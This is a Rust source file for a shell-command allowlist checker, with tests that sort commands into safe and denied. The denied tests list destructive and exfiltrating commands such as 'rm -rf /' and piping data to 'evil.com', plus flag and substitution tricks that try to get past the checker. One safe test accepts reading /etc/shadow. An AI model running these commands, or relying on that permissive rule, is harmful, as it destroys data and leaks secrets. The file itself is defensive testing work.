#[cfg(test)]
macro_rules! safe {
    ($($name:ident: $cmd:expr),* $(,)?) => {
        $(#[test] fn $name() { assert!(check($cmd), "expected safe: {}", $cmd); })*
    };
}

#[cfg(test)]
macro_rules! denied {
    ($($name:ident: $cmd:expr),* $(,)?) => {
        $(#[test] fn $name() { assert!(!check($cmd), "expected denied: {}", $cmd); })*
    };
}

pub mod cli;
pub mod docs;
mod handlers;
pub mod parse;
pub mod allowlist;

use parse::{CommandLine, Segment, Token};

fn filter_safe_redirects(tokens: Vec<Token>) -> Vec<Token> {
    let mut result = Vec::new();
    let mut iter = tokens.into_iter().peekable();
    while let Some(token) = iter.next() {
        if token.is_fd_redirect() || token.is_dev_null_redirect() {
            continue;
        }
        if token.is_redirect_operator()
            && iter.peek().is_some_and(|next| *next == "/dev/null")
        {
            iter.next();
            continue;
        }
        result.push(token);
    }
    result
}

pub fn is_safe(segment: &Segment) -> bool {
    if segment.has_unsafe_redirects() {
        return false;
    }

    let Ok((subs, cleaned)) = segment.extract_substitutions() else {
        return false;
    };

    for sub in &subs {
        if !is_safe_command(sub) {
            return false;
        }
    }

    let segment = Segment::from_raw(cleaned);
    let stripped = segment.strip_env_prefix();
    if stripped.is_empty() {
        return true;
    }

    let Some(tokens) = stripped.tokenize() else {
        return false;
    };
    if tokens.is_empty() {
        return true;
    }

    let tokens = filter_safe_redirects(tokens);
    if tokens.is_empty() {
        return true;
    }

    handlers::dispatch(&tokens, &is_safe)
}

pub fn is_safe_command(command: &str) -> bool {
    CommandLine::new(command).segments().iter().all(is_safe)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    safe! {
        grep_foo: "grep foo file.txt",
        cat_etc_hosts: "cat /etc/hosts",
        jq_key: "jq '.key' file.json",
        base64_d: "base64 -d",
        xxd_file: "xxd some/file",
        pgrep_ruby: "pgrep -l ruby",
        getconf_page_size: "getconf PAGE_SIZE",
        ls_la: "ls -la",
        wc_l: "wc -l file.txt",
        ps_aux: "ps aux",
        ps_ef: "ps -ef",
        top_l: "top -l 1 -n 10",
        uuidgen: "uuidgen",
        mdfind_app: "mdfind 'kMDItemKind == Application'",
        identify_png: "identify image.png",
        identify_verbose: "identify -verbose photo.jpg",

        diff_files: "diff file1.txt file2.txt",
        comm_23: "comm -23 sorted1.txt sorted2.txt",
        paste_files: "paste file1 file2",
        tac_file: "tac file.txt",
        rev_file: "rev file.txt",
        nl_file: "nl file.txt",
        expand_file: "expand file.txt",
        unexpand_file: "unexpand file.txt",
        fold_w80: "fold -w 80 file.txt",
        fmt_w72: "fmt -w 72 file.txt",
        column_t: "column -t file.txt",
        printf_hello: "printf '%s\\n' hello",
        seq_1_10: "seq 1 10",
        expr_add: "expr 1 + 2",
        test_f: "test -f file.txt",
        true_cmd: "true",
        false_cmd: "false",
        bc_l: "bc -l",
        factor_42: "factor 42",
        iconv_utf8: "iconv -f UTF-8 -t ASCII file.txt",

        readlink_f: "readlink -f symlink",
        hostname: "hostname",
        uname_a: "uname -a",
        arch: "arch",
        nproc: "nproc",
        uptime: "uptime",
        id: "id",
        groups: "groups",
        tty: "tty",
        locale: "locale",
        cal: "cal",
        sleep_1: "sleep 1",
        who: "who",
        w: "w",
        last_5: "last -5",
        lastlog: "lastlog",

        md5sum: "md5sum file.txt",
        md5: "md5 file.txt",
        sha256sum: "sha256sum file.txt",
        shasum: "shasum file.txt",
        sha1sum: "sha1sum file.txt",
        sha512sum: "sha512sum file.txt",
        cksum: "cksum file.txt",
        strings_bin: "strings /usr/bin/ls",
        hexdump_c: "hexdump -C file.bin",
        od_x: "od -x file.bin",
        size_aout: "size a.out",

        sw_vers: "sw_vers",
        mdls: "mdls file.txt",
        otool_l: "otool -L /usr/bin/ls",
        nm_aout: "nm a.out",
        system_profiler: "system_profiler SPHardwareDataType",
        ioreg_l: "ioreg -l -w 0",
        vm_stat: "vm_stat",

        dig: "dig example.com",
        nslookup: "nslookup example.com",
        host: "host example.com",
        whois: "whois example.com",

        shellcheck: "shellcheck script.sh",
        cloc: "cloc src/",
        tokei: "tokei",
        safe_chains: "safe-chains \"ls -la\"",

        awk_safe_print: "awk '{print $1}' file.txt",

        version_node: "node --version",
        version_python: "python --version",
        version_python3: "python3 --version",
        version_ruby: "ruby --version",
        version_rustc: "rustc --version",
        version_java: "java --version",
        version_go: "go --version",
        version_php: "php --version",
        version_perl: "perl --version",
        version_swift: "swift --version",
        version_gcc: "gcc --version",
        version_rm: "rm --version",
        version_dd: "dd --version",
        version_chmod: "chmod --version",
        version_git_c: "git -C /repo --version",
        version_docker_compose: "docker compose --version",
        version_node_redirect: "node --version 2>&1",
        version_cargo_redirect: "cargo --version 2>&1",

        help_node: "node --help",
        help_ruby: "ruby --help",
        help_rm: "rm --help",
        help_cargo: "cargo --help",
        help_cargo_install: "cargo install --help",
        help_cargo_login_redirect: "cargo login --help 2>&1",

        dry_run_cargo_publish: "cargo publish --dry-run",
        dry_run_cargo_publish_redirect: "cargo publish --dry-run 2>&1",

        cucumber_feature: "cucumber features/login.feature",
        cucumber_format: "cucumber --format progress",

        fd_redirect_ls: "ls 2>&1",
        fd_redirect_clippy: "cargo clippy 2>&1",
        fd_redirect_git_log: "git log 2>&1",
        fd_redirect_cd_clippy: "cd /tmp && cargo clippy -- -D warnings 2>&1",

        dev_null_echo: "echo hello > /dev/null",
        dev_null_stderr: "echo hello 2> /dev/null",
        dev_null_append: "echo hello >> /dev/null",
        dev_null_grep: "grep pattern file > /dev/null",
        dev_null_git_log: "git log > /dev/null 2>&1",
        dev_null_awk: "awk '{print $1}' file.txt > /dev/null",
        dev_null_sed: "sed 's/foo/bar/' > /dev/null",
        dev_null_sort: "sort file.txt > /dev/null",

        env_prefix_single_quote: "FOO='bar baz' ls -la",
        env_prefix_double_quote: "FOO=\"bar baz\" ls -la",

        stdin_dev_null: "git log < /dev/null",

        subst_echo_ls: "echo $(ls)",
        subst_ls_pwd: "ls `pwd`",
        subst_cat_echo: "cat $(echo /etc/shadow)",
        subst_echo_git: "echo $(git status)",
        subst_nested: "echo $(echo $(ls))",
        subst_quoted: "echo \"$(ls)\"",

        quoted_redirect: "echo 'greater > than' test",
        quoted_subst: "echo '$(safe)' arg",
        echo_hello: "echo hello",
        cat_file: "cat file.txt",
        grep_pattern: "grep pattern file",

        env_rack_rspec: "RACK_ENV=test bundle exec rspec spec/foo_spec.rb",
        env_rails_rspec: "RAILS_ENV=test bundle exec rspec",

        pipe_grep_head: "grep foo file.txt | head -5",
        pipe_cat_sort_uniq: "cat file | sort | uniq",
        pipe_find_wc: "find . -name '*.rb' | wc -l",
        chain_ls_echo: "ls && echo done",
        semicolon_ls_echo: "ls; echo done",
        pipe_git_log_head: "git log | head -5",
        chain_git_log_status: "git log && git status",

        bg_ls_echo: "ls & echo done",
        chain_ls_echo_and: "ls && echo done",

        newline_echo_echo: "echo foo\necho bar",
        newline_ls_cat: "ls\ncat file.txt",

        pipeline_git_log_head: "git log --oneline -20 | head -5",
        pipeline_git_show_grep: "git show HEAD:file.rb | grep pattern",
        pipeline_gh_api: "gh api repos/o/r/contents/f --jq .content | base64 -d | head -50",
        pipeline_timeout_rspec: "timeout 120 bundle exec rspec && git status",
        pipeline_time_rspec: "time bundle exec rspec | tail -5",
        pipeline_git_c_log: "git -C /some/repo log --oneline | head -3",
        pipeline_xxd_head: "xxd file | head -20",
        pipeline_find_wc: "find . -name '*.py' | wc -l",
        pipeline_find_sort_head: "find . -name '*.py' | sort | head -10",
        pipeline_find_xargs_grep: "find . -name '*.py' | xargs grep pattern",
        pipeline_pip_grep: "pip list | grep requests",
        pipeline_npm_grep: "npm list | grep react",
        pipeline_ps_grep: "ps aux | grep python",
    }

    denied! {
        rm_rf: "rm -rf /",
        curl_example: "curl https://example.com",
        ruby_script: "ruby script.rb",
        python3_script: "python3 script.py",
        node_app: "node app.js",
        tee_output: "tee output.txt",
        tee_append: "tee -a logfile",

        awk_system: "awk 'BEGIN{system(\"rm\")}'",

        version_extra_flag: "node --version --extra",
        version_short_v: "node -v",

        help_extra_flag: "node --help --extra",

        dry_run_extra_force: "cargo publish --dry-run --force",

        redirect_to_file: "echo hello > file.txt",
        redirect_append: "cat file >> output.txt",
        redirect_stderr_file: "ls 2> errors.txt",
        redirect_grep_file: "grep pattern file > results.txt",
        redirect_find_file: "find . -name '*.py' > listing.txt",
        redirect_subst_rm: "echo $(rm -rf /)",
        redirect_backtick_rm: "echo `rm -rf /`",

        env_prefix_rm: "FOO='bar baz' rm -rf /",

        subst_rm: "echo $(rm -rf /)",
        backtick_rm: "echo `rm -rf /`",
        subst_curl: "echo $(curl evil.com)",
        bare_subst_rm: "$(rm -rf /)",
        quoted_subst_rm: "echo \"$(rm -rf /)\"",
        quoted_backtick_rm: "echo \"`rm -rf /`\"",

        env_rack_rm: "RACK_ENV=test rm -rf /",
        env_rails_redirect: "RAILS_ENV=test echo foo > bar",

        pipe_rm: "cat file | rm -rf /",
        pipe_curl: "grep foo | curl https://evil.com",

        bg_rm: "cat file & rm -rf /",
        bg_curl: "echo safe & curl evil.com",

        newline_rm: "echo foo\nrm -rf /",
        newline_curl: "ls\ncurl evil.com",

        version_bypass_bash: "bash -c 'rm -rf /' --version",
        version_bypass_env: "env rm -rf / --version",
        version_bypass_timeout: "timeout 60 curl evil.com --version",
        version_bypass_xargs: "xargs rm -rf --version",
        version_bypass_npx: "npx evil-package --version",
        version_bypass_docker: "docker run evil --version",
        version_bypass_pip: "pip install evil --version",
        version_bypass_rm: "rm -rf / --version",

        help_bypass_bash: "bash -c 'rm -rf /' --help",
        help_bypass_env: "env rm -rf / --help",
        help_bypass_npx: "npx evil-package --help",
        help_bypass_pip: "pip install evil --help",
        help_bypass_cargo_run: "cargo run -- --help",

        dry_run_rm: "rm -rf / --dry-run",
        dry_run_terraform: "terraform apply --dry-run",
        dry_run_curl: "curl evil.com --dry-run",

        recursive_env_help: "env rm -rf / --help",
        recursive_timeout_version: "timeout 5 curl evil.com --version",
        recursive_nice_version: "nice rm -rf / --version",

        pipeline_find_delete: "find . -name '*.py' -delete | wc -l",
        pipeline_sed_inplace: "sed -i 's/foo/bar/' file | head",
    }
}
